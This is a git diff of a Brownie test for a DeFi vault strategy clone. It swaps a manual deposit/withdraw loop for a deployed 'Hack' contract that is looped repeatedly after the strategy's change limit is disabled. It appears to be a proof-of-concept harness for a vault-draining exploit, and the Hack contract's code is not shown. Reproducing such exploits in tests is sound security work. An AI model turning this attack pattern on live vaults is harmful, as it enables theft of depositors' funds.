@@ -1,6 +1,6 @@
 import pytest
 import brownie
-from brownie import Wei, accounts, Contract, config
+from brownie import Wei, accounts, Contract, config, Hack
 
 
 def test_clone(
@@ -66,33 +66,34 @@ def test_clone(
     vault.removeStrategyFromQueue(strategy, {"from": gov})
     vault.addStrategy(new_strategy, 10_000, 0, 2 ** 256 - 1, 1_000, {"from": gov})
 
+    hack = user.deploy(Hack, vault, token)
     user_start_balance = token.balanceOf(user)
     before_pps = vault.pricePerShare()
-    token.approve(vault.address, 2**256-1, {"from": user})
-    vault.deposit({"from": user})
-
-    token.transfer(new_strategy, 1_000 * 10 ** token.decimals(), {"from": reserve})
+    token.transfer(hack, user_start_balance, {"from": user})
+    print(f"Balance of Hack: {token.balanceOf(hack)/1e6:_}")
+    hack.deposit()
+    token.transfer(new_strategy, 1_000 * 1e6, {"from": reserve})
 
     # Get profits and withdraw
     print(before_pps)
     before_pps = vault.pricePerShare()
-    new_strategy.harvest({"from": gov})
+    vault.setStrategyEnforceChangeLimit(new_strategy, False, {"from": gov})
+    tx = new_strategy.harvest({"from": gov})
     chain.sleep(3600 * 6)
     chain.mine(1)
-    #assert vault.pricePerShare() > before_pps
-    
-    before_pps = vault.pricePerShare()
-    print(vault.pricePerShare())
-    vault.withdraw({"from": user})
 
-    for i in range(200):
-        print(f"pps: {vault.pricePerShare()/1e6:_}")
-        print(f"bal: {token.balanceOf(user)/1e6:_}")
-        vault.deposit({"from": user})
-        print(f"pps: {vault.pricePerShare()/1e6:_}")
-        vault.withdraw({"from": user})
+    hack.loop(8)
+    print(f"token balance end of loop: {token.balanceOf(hack)/1e6:_}")
+    hack.deposit()
 
-    print(f"pps: {vault.pricePerShare()/1e6:_}")
+    hack.loop(8)
+    print(f"token balance end of loop: {token.balanceOf(hack)/1e6:_}")
+    hack.deposit()
 
-    #assert vault.pricePerShare() > before_pps
-    #assert user_end_balance > user_start_balance
+    hack.loop(8)
+    print(f"token balance end of loop: {token.balanceOf(hack)/1e6:_}")
+    hack.deposit()
+
+    hack.loop(8)
+    print(f"token balance end of loop: {token.balanceOf(hack)/1e6:_}")
+    hack.deposit()
